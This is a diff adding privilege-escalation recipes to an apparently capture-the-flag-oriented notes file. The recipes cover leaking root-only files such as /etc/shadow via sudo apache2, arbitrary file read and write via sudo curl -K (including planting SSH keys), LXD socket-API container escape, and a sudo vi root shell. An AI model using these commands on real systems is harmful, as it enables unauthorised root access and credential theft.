@@ -1658,3 +1658,91 @@ then race the gated action in the same window. Drive it with a THREADED client (
 threads); a bash `/dev/tcp` connection flood fork-bombs your own session.
 
 <!-- promoted-slug: suid-toctou-file-race -->
+
+## sudo apache2/httpd -> read root-only files via config-parse leak
+
+With `(ALL) NOPASSWD: /usr/sbin/apache2` (or `httpd`), `apache2 -f <file>` parses the file as a
+config; a line that is not a valid directive raises `AH00526: Syntax error ... Invalid command
+'<line>'`, echoing the file's content back as root. Pointing `-f` straight at the target fails early
+with "No MPM loaded" - the config must first `LoadModule` an MPM, then `Include` the target so the
+parse reaches (and leaks) its content:
+```
+printf 'LoadModule mpm_event_module /usr/lib/apache2/modules/mod_mpm_event.so\nServerName x\nInclude /root/root.txt\n' > /tmp/ac
+sudo /usr/sbin/apache2 -f /tmp/ac
+# -> Invalid command 'THM{...}' / first line of /etc/shadow, etc.
+```
+Swap the MPM path/name for the distro's (`mod_mpm_prefork.so`, `mpm_prefork_module`). Reads any
+root-readable file (`/etc/shadow`, SSH keys, flags). Same idea works with an Apache config that sets
+`DocumentRoot /` + a permissive `<Directory>` to serve the whole filesystem over HTTP as root.
+
+<!-- promoted-slug: sudo-apache2-fileread -->
+
+## sudo curl with a restricted URL -> arbitrary file read/write via `-K` config
+
+Sudoers like `(user) /usr/bin/curl 127.0.0.1/*` looks locked to one host, but curl's config-file
+option escapes it. Two rules matter: the URL must be the **FIRST** argument (any flag before it
+fails the sudoers match, `Sorry, ... not allowed`), and **trailing** flags ARE allowed. A trailing
+`-K <file>` loads a curl config (world-readable, written as the low-priv user) that supplies
+arbitrary `url`/`output`, so you act with the target user's privileges.
+
+Read any file as the target user (the file content follows the throwaway `127.0.0.1/` response on
+stdout - strip the HTML):
+```
+printf 'url = "file:///path/to/secret"\n' > /tmp/uc
+sudo -u <user> /usr/bin/curl 127.0.0.1/ -s -K /tmp/uc
+```
+
+Write any file as the target user - put `output` **before** `url` in the config so it pairs with the
+`file://` transfer, give the command-line url its own `-o /dev/null`, and `create-dirs` makes parents.
+Classic use: plant `authorized_keys` for an SSH shell as the target user:
+```
+printf 'create-dirs\noutput = "/home/<user>/.ssh/authorized_keys"\nurl = "file:///tmp/mypub"\n' > /tmp/wcfg
+sudo -u <user> /usr/bin/curl 127.0.0.1/ -o /dev/null -K /tmp/wcfg
+```
+
+Generalizes to any `sudo curl` whose URL/host is constrained: the `-K` config (or `-o` write, `file://`
+read) is the primitive; the sudoers pattern only limits the first argument.
+
+<!-- promoted-slug: sudo-curl-k-gadget -->
+
+### LXD-group gotcha: snap `lxc` CLI dies on a broken passwd home — use the socket API
+
+On snap-based LXD (`/snap/bin/lxc`), the `lxc` client refuses to run if the invoking user's passwd
+home dir does not exist / is not creatable: `WARNING: cannot create user data directory: cannot
+create snap home dir: mkdir /home/<user>` then it aborts. snapd derives the home from the passwd
+entry via getpwuid and IGNORES `$HOME` — `HOME=/tmp/x lxc ...` does NOT fix it, and `/home` is
+usually root-owned so you cannot create the missing dir. This blocks the classic lxc-CLI privesc.
+
+Fallback: drive the LXD REST API directly over the unix socket (the `lxd` group grants access to
+`srw-rw---- root:lxd /var/snap/lxd/common/lxd/unix.socket`), bypassing the snap CLI entirely:
+
+```bash
+# raw HTTP over the socket (curl, or a python socket if curl is absent):
+curl -s --unix-socket /var/snap/lxd/common/lxd/unix.socket a/1.0/instances
+# then POST /1.0/images (upload alpine tarball), POST /1.0/instances with
+# security.privileged=true + a disk device source=/ path=/mnt/root, start, and exec.
+```
+Still needs an image (build with lxd-alpine-builder and push, or a remote pull if the box has
+internet). If a simpler root exists (a plain `sudo <bin>` GTFOBin, a SUID), prefer it over this.
+
+<!-- promoted-slug: lxd-snap-broken-home -->
+
+### sudo NOPASSWD binary with `(ALL : !root)` — plain GTFOBins form first on patched sudo
+
+When `sudo -l` shows a group-restricted rule like `(ALL : !root) NOPASSWD: /usr/bin/vi`, the working
+escalation on MODERN sudo (>= 1.8.28) is the PLAIN GTFOBins form with NO runas flags:
+
+```bash
+sudo /usr/bin/vi -c ':!/bin/sh' /dev/null   # runs as root:root, matches (ALL : !root) => root shell
+```
+
+Do NOT reach for runas variants first — on a `(ALL : !root)` rule they all fail, and thrashing through
+them wastes many attempts:
+- `sudo -u#-1 <bin>` (CVE-2019-14287) is PATCHED on sudo >= 1.8.28: fails with `sudo: unknown user: #-1`.
+- `sudo -g <grp> <bin>` runs as the INVOKING user with that group (uid unchanged, NOT root).
+- `sudo -u root -g <grp> <bin>` prompts for the user's password (that runas is not the NOPASSWD match).
+
+The `!root` restricts the runas GROUP only when `-g` is explicitly passed; a bare `sudo <bin>` defaults
+to root:root and is allowed. Always `sudo --version` first: `-u#-1` is only a fallback on sudo < 1.8.28.
+
+<!-- promoted-slug: sudo-nopasswd-plain-form -->
